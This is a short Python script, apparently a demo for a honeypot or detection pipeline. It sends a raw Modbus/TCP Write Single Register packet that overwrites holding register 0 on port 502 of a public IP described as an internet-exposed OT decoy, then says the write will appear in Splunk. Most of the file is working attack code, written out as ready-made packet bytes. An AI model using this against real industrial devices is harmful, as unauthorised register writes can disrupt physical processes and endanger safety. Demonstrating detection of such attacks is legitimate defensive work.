import socket, os

# --- demo output IP masking: public (attacker) IPs shown as A.B.xxx.xxx; loopback/private stay visible ---
import re as _re
def _maskip(_m):
    _p = _m.group(0).split("."); _a, _b = int(_p[0]), int(_p[1])
    if _a in (0, 10, 127) or (_a == 172 and 16 <= _b <= 31) or (_a == 192 and _b == 168) or (_a == 169 and _b == 254):
        return _m.group(0)
    return _p[0] + "." + _p[1] + ".xxx.xxx"
__b_print = print
def print(*args, **kw):
    args = [_re.sub(r"\b(?:\d{1,3}\.){3}\d{1,3}\b", _maskip, a) if isinstance(a, str) else a for a in args]
    __b_print(*args, **kw)
# --- end IP masking ---


# Modbus/TCP "Write Single Register" (FC06): an external attacker overwrites
# holding register 0 of an internet-exposed OT device with the value 0x00FF.
# The decoy's public IP rotates - override it without editing this file:
#   PowerShell:  $env:DECOY_IP="34.66.220.215"; python demo_attack.py
DECOY_IP = os.environ.get("DECOY_IP", "34.66.220.215")  # current internet-exposed OT decoy
TARGET = (DECOY_IP, 502)
PDU    = bytes.fromhex("0001000000060106000000ff")  # FC06  reg[0] = 0x00FF

print(f"[ATTACK]  Modbus WRITE  ->  {TARGET[0]}:{TARGET[1]}")
print(f"[WIRE]    {PDU.hex(' ')}")

sock = socket.create_connection(TARGET, timeout=8)
sock.sendall(PDU)
reply = sock.recv(64)
sock.close()

print(f"[REPLY]   {reply.hex(' ')}   (decoy is live, attack logged)")
print("[DONE]    watch it land in Splunk in ~5s")
